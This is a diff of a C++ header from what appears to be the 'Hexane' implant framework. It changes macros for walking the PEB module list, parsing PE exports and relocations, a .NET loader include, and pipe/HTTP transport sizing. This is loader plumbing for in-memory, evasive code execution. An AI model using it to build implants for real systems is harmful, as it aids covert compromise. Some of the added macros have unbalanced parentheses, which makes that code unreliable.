@@ -1,7 +1,7 @@
 #ifndef HEXANE_MONOLITH_HPP
 #define HEXANE_MONOLITH_HPP
 #include <core/ntimports.hpp>
-#include <metahost.h>
+#include <core/dotnet.hpp>
 
 EXTERN_C LPVOID InstStart();
 EXTERN_C LPVOID InstEnd();
@@ -52,20 +52,19 @@ EXTERN_C LPVOID InstEnd();
 #define REG_PEB32(ctx) 						    (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Ebx) + 0x8))
 #define REG_PEB64(ctx) 						    (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Rdx) + 0x10))
 
-#define IMAGE_DOS_HEADER(base)                	(R_CAST(PIMAGE_DOS_HEADER, base)
+#define IMAGE_DOS_HEADER(base)                	(R_CAST(PIMAGE_DOS_HEADER, base))
 #define IMAGE_NT_HEADERS(base, dos)				(R_CAST(PIMAGE_NT_HEADERS, B_PTR(base) + dos->e_lfanew))
-#define IMAGE_EXPORT_DIRECTORY(dos, nt)	    	(R_CAST(PIMAGE_EXPORT_DIRECTORY, B_PTR(dos) + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
+#define IMAGE_EXPORT_DIRECTORY(dos, nt)	    	(R_CAST(PIMAGE_EXPORT_DIRECTORY, (U_PTR(dos) + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)))
 
-#define MODULE_ENTRY(next)                      (R_CAST(PLDR_MODULE, (B_PTR(next) - sizeof(ULONG)* 4))
-#define IN_MEMORY_ORDER_MODULE_LIST             (R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList)
-#define RELOCATION_ENTRIES(base, raw, off)		(R_CAST(PBASE_RELOCATION_ENTRY, U_PTR(base) + raw + off))
-#define RELOCATION_BLOCK(base, raw, off)		(R_CAST(PBASE_RELOCATION_BLOCK, U_PTR(base) + raw + off))
-#define BASE_RELOCATION_COUNT(blk)				((blk->SizeOfBlock - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))
+#define MODULE_ENTRY(next)                      (R_CAST(PLDR_MODULE, (B_PTR(next) - sizeof(ULONG)* 4)))
+#define MODULE_LIST                             (R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList)))
+#define BASERELOC_ENTRIES(base, raw, off)		(R_CAST(PBASE_RELOCATION_ENTRY, U_PTR(base) + raw + off))
+#define BASERELOC_BLOCK(base, raw, off)		    (R_CAST(PBASE_RELOCATION_BLOCK, U_PTR(base) + raw + off))
+#define BASERELOC_COUNT(blk)				    ((blk->SizeOfBlock - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))
 
 #define RVA(Ty, base, rva)  					(R_CAST(Ty, U_PTR(base) + rva))
-#define PATCH_ADDRESS(base, addr)				(R_CAST(LPVOID, R_CAST(ULONG_PTR, base) + addr))
-#define SECTION_OFFSET(data1, data2) 			(R_CAST(LPVOID, R_CAST(ULONG_PTR, data1->lpBase) + data2->Sections->VirtualAddress))
-#define SECTION_DATA(data) 						(R_CAST(LPVOID, R_CAST(ULONG_PTR, data->lpBuffer) + data->Sections->PointerToRawData))
+#define SECTION_OFFSET(obj, fHead) 			    (R_CAST(LPVOID, R_CAST(ULONG_PTR, obj->lpBase) + fHead->Sections->VirtualAddress))
+#define SECTION_DATA(obj, fHead) 				(R_CAST(LPVOID, R_CAST(ULONG_PTR, obj->lpBuffer) + fHead->Sections->PointerToRawData))
 
 #define NtCurrentProcess()              		(R_CAST(HANDLE, -1))
 #define NtCurrentThread()               		(R_CAST(HANDLE, S_CAST(LONG_PTR, -2))
@@ -123,7 +122,7 @@ EXTERN_C LPVOID InstEnd();
 
 #ifdef TRANSPORT_PIPE
 #define MESSAGE_MAX PIPE_BUFFER_MAX
-#elif defined TRANSPORT_HTTP
+#else
 #define MESSAGE_MAX HTTP_REQUEST_MAX
 #endif
 
